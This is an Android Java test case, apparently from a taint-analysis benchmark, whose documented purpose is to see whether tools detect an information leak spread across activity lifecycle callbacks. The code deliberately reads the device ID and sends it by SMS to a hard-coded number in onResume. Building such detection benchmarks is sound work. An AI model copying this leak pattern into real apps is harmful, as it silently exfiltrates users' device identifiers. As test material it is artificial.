package edu.uta;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

//Require three event sequences for detection.

/**
 * @testcase_name Lifecycle_ActivityEventSequence3
 * 
 * @description   Testing if information leak due to triggering of different events (not activity callbacks) can be detected. Each event can invoke a sequence of callbacks in the activity. 
 * @dataflow onUserLeaveHint: source ->  onUserLeaveHint -> onSaveInstanceState -> onRestoreInstanceState -> onResume: sink
 * @number_of_leaks 1
 * @challenges  The analysis tool must be able to detect data leaks which are triggered by different ordering of event sequences. Each event in the event sequence invokes a set of callbacks in a specific order. 
 * 
 */

public class ActivityEventSequence3 extends Activity {

	private String d1 = "";
	private String d2 = "";
	private String d3 = "";
	private String recpNo = "5556";

	@Override
	public void onCreate(Bundle instance){
		super.onCreate(instance);

		setContentView(R.layout.activity_main);
	}
	
	@Override 
	public void onRestoreInstanceState(Bundle state)
	{
		this.d3 = state.getString("myData");
		super.onRestoreInstanceState(state);
	}
	
	@Override
	public void onResume()
	{
		Toast.makeText(this, "d3 is: " + d3, Toast.LENGTH_SHORT).show();
		if(!d3.equalsIgnoreCase(""))
			SmsManager.getDefault().sendTextMessage(recpNo, null, d3, null, null);
		super.onResume();
	}
	
	@Override
	public void onUserLeaveHint(){
		this.d2 = this.d1;
		TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
		this.d1 = tMgr.getDeviceId();
		super.onUserLeaveHint();
	}
	
	@Override
	public void onSaveInstanceState(Bundle outState){
		outState.putString("myData", this.d2);
		super.onSaveInstanceState(outState);
	}


}